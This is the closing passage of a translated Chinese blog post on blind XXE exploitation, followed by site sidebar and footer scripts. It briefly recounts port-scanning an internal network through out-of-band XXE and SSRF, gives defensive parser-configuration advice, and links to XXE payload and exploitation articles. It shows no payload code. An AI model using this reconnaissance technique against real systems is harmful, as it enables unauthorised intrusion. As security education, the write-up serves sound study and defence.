+<p>文中很早讨论过针对主机的端口扫描，当时是因为我不知道IP范围，只能扫描本地主机。得益于OOB技术的使用，确定了内网范围，所以另一边使用<code>burp intruder</code>执行端口扫描。</p>
+<p>扫描结果显示本机不仅开放了8080端口，而且还监听了所有接口的流量，这意味着可以实施更多的迭代猜测。这也意味着在本例中可以通过SSRF来识别其他的应用程序，这非常有意思。</p>
+<h1 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h1><p>XXE的主要问题是XML解析器解析了用户发送的不可信数据（译者注：一切用户输入都是不可信的）。然而，在DTD文档中只验证系统标志符中出现的数据是不可能的。默认情况下，大多数XML解析器都容易遭受XXE攻击。所以，最好的解决办法是配置XML处理器仅使用本地静态DTD，同时禁止XML文档中的DTD声明。</p>
+<h1 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h1><p>如果你喜欢这篇文章，同时又想更加了解XXE，下面这些文章将为你提供更多信息。</p>
+<ul>
+<li><a href="https://shiftordie.de/blog/2017/02/18/smtp-over-xxe/" target="_blank" rel="external">SMTP over XXE</a></li>
+<li><a href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html" target="_blank" rel="external">XXE OOB Attacks</a></li>
+<li><a href="https://www.christian-schneider.net/GenericXxeDetection.html" target="_blank" rel="external">Generic XXE Detection</a></li>
+<li><a href="https://blog.netspi.com/playing-content-type-xxe-json-endpoints/" target="_blank" rel="external">XXE on JSON EndPoints</a></li>
+<li><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Wang-FileCry-The-New-Age-Of-XXE.pdf" target="_blank" rel="external">New Age of XXE(2015)</a></li>
+<li><a href="https://www.slideshare.net/d0znpp/xxe-advanced-exploitation" target="_blank" rel="external">XXE Advanced Exploitaion</a></li>
+<li><a href="https://gist.github.com/staaldraad/01415b990939494879b4" target="_blank" rel="external">XXE Payloads</a></li>
+</ul>
+<p><a href="https://blog.zsec.uk/blind-xxe-learning/" target="_blank" rel="external"><strong>原文在这</strong></a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/xxe/" rel="tag"># xxe</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/07/10/php-generic-gadget-chains/" rel="next" title="php通用gadget工具包：黑夜中反序列化利器">
+                <i class="fa fa-chevron-left"></i> php通用gadget工具包：黑夜中反序列化利器
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8yODY0MC81MjEx"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/uploads/header.png"
+               alt="oTex911" />
+          <p class="site-author-name" itemprop="name">oTex911</p>
+           
+              <p class="site-description motion-element" itemprop="description">Just another infosec lover blog</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">18</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">22</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://suroot.cn" title="c0rpse" target="_blank">c0rpse</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.fangheart.top/" title="FangHeart" target="_blank">FangHeart</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.th1s.cn" title="th1s" target="_blank">th1s</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.cnblogs.com/lcamry" title="Icamry" target="_blank">Icamry</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://github.com/cure53" title="Cure53" target="_blank">Cure53</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.yunqingqing.com" title="YunQing" target="_blank">YunQing</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#你对XXE了解吗？"><span class="nav-number">1.</span> <span class="nav-text">你对XXE了解吗？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#最初的发现"><span class="nav-number">2.</span> <span class="nav-text">最初的发现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#继续前行"><span class="nav-number">3.</span> <span class="nav-text">继续前行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#开始猎杀"><span class="nav-number">4.</span> <span class="nav-text">开始猎杀</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#端口扫描"><span class="nav-number">5.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#外交"><span class="nav-number">6.</span> <span class="nav-text">外交</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#带外攻击（OOB）"><span class="nav-number">7.</span> <span class="nav-text">带外攻击（OOB）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#文件识别"><span class="nav-number">7.1.</span> <span class="nav-text">文件识别</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#发现内网IP"><span class="nav-number">8.</span> <span class="nav-text">发现内网IP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#防御建议"><span class="nav-number">9.</span> <span class="nav-text">防御建议</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#拓展阅读"><span class="nav-number">10.</span> <span class="nav-text">拓展阅读</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">oTex911</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("4uBSvV1VfS66JnxARLfv7BLu-gzGzoHsz", "0bxJ6KeAL6WiGATTp6QW4FpN");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+
+  <script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
